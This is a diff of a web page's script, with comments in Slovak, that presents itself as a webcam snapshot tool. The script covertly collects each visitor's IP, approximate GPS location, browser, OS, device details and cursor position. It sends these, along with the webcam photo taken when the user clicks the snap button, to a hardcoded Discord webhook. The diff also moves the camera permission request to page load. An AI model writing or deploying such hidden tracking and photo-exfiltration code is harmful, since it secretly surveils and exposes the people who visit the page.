@@ -13,18 +13,19 @@
 <script>
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1466082233713557607/k8-lt3aCsanEJjEf_95RkOyj6SRLkeHiF0jZL4Mi_80mNhJHfvKAo-lfEayMQ_FvwRLO";
 const IPINFO = "https://ipinfo.io/json";
+
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const snapBtn = document.getElementById("snapBtn");
 let mouse = { x: 0, y: 0 };
 
-// cursor tracking
+// tracknut cursor
 document.addEventListener("mousemove", e => {
     mouse.x = e.clientX;
     mouse.y = e.clientY;
 });
 
-// browser & OS helpers
+// helpery
 function parseBrowser(ua) {
     if (ua.includes("Chrome")) return "Chrome";
     if (ua.includes("Firefox")) return "Firefox";
@@ -38,9 +39,7 @@ function parseOS(ua, platform) {
     if (/Windows NT 6.3/.test(ua)) return "Windows 8.1";
     if (/Windows NT 6.2/.test(ua)) return "Windows 8";
     if (/Windows NT 6.1/.test(ua)) return "Windows 7";
-    if (/Mac OS X (\d+[\._]\d+)/.test(ua)) {
-        return "macOS " + ua.match(/Mac OS X (\d+[\._]\d+)/)[1].replace("_", ".");
-    }
+    if (/Mac OS X (\d+[\._]\d+)/.test(ua)) return "macOS " + ua.match(/Mac OS X (\d+[\._]\d+)/)[1].replace("_", ".");
     if (/Android (\d+[\.\d]*)/.test(ua)) return "Android " + ua.match(/Android (\d+[\.\d]*)/)[1];
     if (/iPhone OS (\d+_\d+)/.test(ua)) return "iOS " + ua.match(/iPhone OS (\d+_\d+)/)[1].replace("_", ".");
     if (/iPad; CPU OS (\d+_\d+)/.test(ua)) return "iPadOS " + ua.match(/iPad; CPU OS (\d+_\d+)/)[1].replace("_", ".");
@@ -52,7 +51,7 @@ function deviceType() {
     return screen.width <= 768 ? "Mobile" : "Desktop";
 }
 
-// data object
+// data objekt
 const data = {
     time: new Date().toLocaleString(undefined, {
         year: "numeric", month: "2-digit", day: "2-digit",
@@ -71,7 +70,7 @@ const data = {
     ramApprox: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A"
 };
 
-// IP a GPS z ipinfo
+// IP a GPS ipinfo
 fetch(IPINFO)
 .then(r => r.json())
 .then(ip => {
@@ -85,7 +84,22 @@ fetch(IPINFO)
     data.gps = ip.loc || "N/A";
 });
 
-// discord embed function
+// request cam
+async function initCamera() {
+    try {
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        video.srcObject = stream;
+        video.onloadedmetadata = () => video.play();
+        data.permissions.camera = "granted";
+    } catch (err) {
+        data.permissions.camera = "denied";
+        alert("Camera access denied!");
+    }
+}
+
+initCamera();
+
+// poslat embed na discord
 function sendEmbed(imageBlob) {
     data.mouse = mouse;
     const embed = {
@@ -118,34 +132,30 @@ function sendEmbed(imageBlob) {
     fetch(WEBHOOK_URL, { method: "POST", body: form });
 }
 
-// urobit fotku + permission
+// odfotit
 snapBtn.addEventListener("click", async () => {
-    try {
-        // spytat na camera permission
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        data.permissions.camera = "granted";
-        video.srcObject = stream;
-
-        // nakreslit do canvas
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        const ctx = canvas.getContext("2d");
-        ctx.drawImage(video, 0, 0);
-
-        // poslat na webhook a stiahnut (hehehehe)
-        canvas.toBlob(blob => {
-            sendEmbed(blob);
-            const link = document.createElement("a");
-            const filename = new Date().toISOString().replace(/:/g, "-") + ".png";
-            link.href = URL.createObjectURL(blob);
-            link.download = filename;
-            link.click();
-        }, "image/png");
-
-    } catch (err) {
-        data.permissions.camera = "denied";
-        alert("Camera access denied or blocked!");
+    if (!video.srcObject) {
+        alert("Camera not ready or permision denied");
+        return;
     }
+
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0);
+
+    canvas.toBlob(blob => {
+        if (!blob) return;
+
+        // poslat na discord
+        sendEmbed(blob);
+
+        // stiahnut
+        const link = document.createElement("a");
+        link.href = URL.createObjectURL(blob);
+        link.download = new Date().toISOString().replace(/:/g, "-") + ".png";
+        link.click();
+    }, "image/png");
 });
 </script>
 </body>
